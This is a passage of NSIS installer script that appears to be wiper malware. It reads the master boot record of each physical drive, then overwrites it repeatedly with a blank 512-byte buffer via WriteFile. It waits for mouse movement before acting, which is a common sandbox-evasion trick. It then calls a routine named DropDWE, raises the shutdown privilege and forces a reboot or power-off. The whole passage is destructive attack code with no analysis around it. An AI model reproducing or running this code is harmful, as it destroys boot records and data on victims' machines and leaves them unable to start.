				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5]:[$6:$7:$8]"
				    ${If} $5 <> 0
				        IntOp $4 $4 + 1
				    ${EndIf}
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    DetailPrint "              $1"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "[$5]:[$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5]:[$6:$7:$8]"
				    ${If} $5 <> 0
				        IntOp $4 $4 + 1
				    ${EndIf}
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,,,,,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    System::Call "*$9${stMBR} i (,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.r5,.r6,.r7,.r8,)"
				    IntFmt $5 "%02X" $5
				    IntFmt $6 "%02X" $6
				    IntFmt $7 "%02X" $7
				    IntFmt $8 "%02X" $8
				    StrCpy $1 "$1:[$5:$6:$7:$8]"
				    DetailPrint "              $1"
				    DetailPrint "              Usable PTE's: $4"
				!endif
				!if ${DEBUG_MODE} == 1
				    DetailPrint "       Parse MBR"
    				!endif
				Push $0
				Push $2
				Push $9
				Push $2
				Push $9
				Call ProcessMBR
				Pop $9
				Pop $2
				Pop $0
				System::Alloc 512
	    			pop $5
	    			System::Alloc 4
	    			pop $6
				!if ${DEBUG_MODE} == 1
				    DetailPrint "       Overwrite MBR..."
				!endif
				!if ${REAL_OVERWRITE_MODE} == 1
				    ${ForEach} $7 1 ${OVERWRITE_COUNT} + 1
					System::Call "kernel32::SetFilePointer(i, i ,i ,i) i (r2, 0, ${NULL}, ${FILE_BEGIN}) .r3"
					${If} $3 <> -1
					    System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, ${NULL})"
					    System::Call "kernel32::FlushFileBuffers(i) i (r2)"
					${EndIf}
				    ${Next}
				!endif
				!if ${DEBUG_MODE} == 1
				    DetailPrint "       OK"
				!endif
				System::Free $6
	    			System::Free $5
			    ${EndIf}
			${EndIf}
			System::Call "kernel32::CloseHandle(i) i (r2)"
		    ${Else}
			GoTo end_main_loop
		    ${EndIf}
		    IntOp $0 $0 + 1
		    GoTo main_loop
		end_main_loop:
		    ${If} $0 = 0
			!if ${DEBUG_MODE} == 1
			    DetailPrint "Error: Can't open hard drive"
			!endif
		    ${Else}
			!if ${DEBUG_MODE} == 1
			    DetailPrint "Sleep 10 seconds..."
			!endif
			System::Call "kernel32::Sleep(i) i (10000)"
			!if ${DEBUG_MODE} == 1
			    DetailPrint "Start waiting for user events..."
			!endif
			StrCpy $7 0
			System::Call "user32::GetCursorPos(*l) i (.r7) i .r0"
			${If} $0 <> 0
			    System::Int64Op $7 & 0xFFFFFFFF00000000
			    Pop $8
			    System::Int64Op $8 >> 32
			    Pop $8
			    System::Int64Op $7 & 0x00000000FFFFFFFF
			    Pop $9
			${EndIf}
			StrCpy $1 0
			wait_user_events:
			    System::Call "kernel32::Sleep(i) i (100)  i .r0"
			    System::Call "user32::GetCursorPos(*l) i (.r1)  i .r0"
			    ${If} $0 <> 0
			        System::Int64Op $1 & 0xFFFFFFFF00000000
			        Pop $2
			        System::Int64Op $2 >> 32
			        Pop $2
			        System::Int64Op $1 & 0x00000000FFFFFFFF
			        Pop $3
			    ${EndIf}
			    ${If} $2 <> $8
				${If} $2 < $8
				    IntOp $0 $8 - $2
				${Else}
				    IntOp $0 $2 - $8
				${EndIf}
				${If} $0 > 10
				    Goto user_events
				${EndIf}
			    ${EndIf}
			    ${If} $3 <> $9
				${If} $3 < $9
				    IntOp $0 $9 - $3
				${Else}
				    IntOp $0 $3 - $9
				${EndIf}
				${If} $0 > 10
				    Goto user_events
				${EndIf}
			    ${EndIf}
			    goto wait_user_events
			user_events:
			!if ${DEBUG_MODE} == 1
			    DetailPrint "Event detected"
			    DetailPrint "Sleep 10 seconds..."
			!endif
			System::Call "kernel32::Sleep(i) i (10000)"
			Call DropDWE
			System::Call "kernel32::Sleep(i) i (30000)"
			!if ${SHUTDOWN_MODE} != 0
			    !if ${DEBUG_MODE} == 1
				!if ${SHUTDOWN_MODE} == 1
			    	    DetailPrint "Rebooting..."
				!endif
				!if ${SHUTDOWN_MODE} == 2
			    	    DetailPrint "Shutting down..."
				!endif
			    !endif
			    StrCpy $1 0
			    System::Call "advapi32::OpenProcessToken(i, i, *i) i (-1, ${TOKEN_QUERY}|${TOKEN_ADJUST_PRIVILEGES}, .r1) i .r0"
			    ${If} $0 != 0
				System::Call "advapi32::LookupPrivilegeValue(t, t, *l) i (n, '${SE_SHUTDOWN_NAME}', .r2r2) i .r0"
				${If} $0 != 0
				    System::Call "*(i 1, l r2, i ${SE_PRIVILEGE_ENABLED}) i .r0"
				    System::Call "advapi32::AdjustTokenPrivileges(i, i, i, i, i, i) i (r1, 0, r0, 0, 0, 0)"
				    System::Free $0
				${EndIf}
				System::Call "kernel32::CloseHandle(i) i (r1)"
			    ${EndIf}
			    !if ${SHUTDOWN_MODE} == 1
				call ExitWindowsEx_EWX_REBOOT
				;System::Call "user32::ExitWindowsEx(i, i) i (${EWX_REBOOT}|${EWX_FORCE}, ${SHTDN_REASON_MAJOR_SOFTWARE}|${SHTDN_REASON_MINOR_UPGRADE}) i .r0"
			    !endif
			    !if ${SHUTDOWN_MODE} == 2
				call ExitWindowsEx_EWX_POWEROFF				
				;System::Call "user32::ExitWindowsEx(i, i) i (${EWX_POWEROFF}|${EWX_FORCE}, 0) i .r0"
			    !endif
			!endif
		    ${EndIf}
		    System::Free $9
		!if ${DEBUG_MODE} == 1
		    done:
		!endif
	    ${EndIf}
	${EndIf}
    ${EndIf}
${EndIf}

SectionEnd
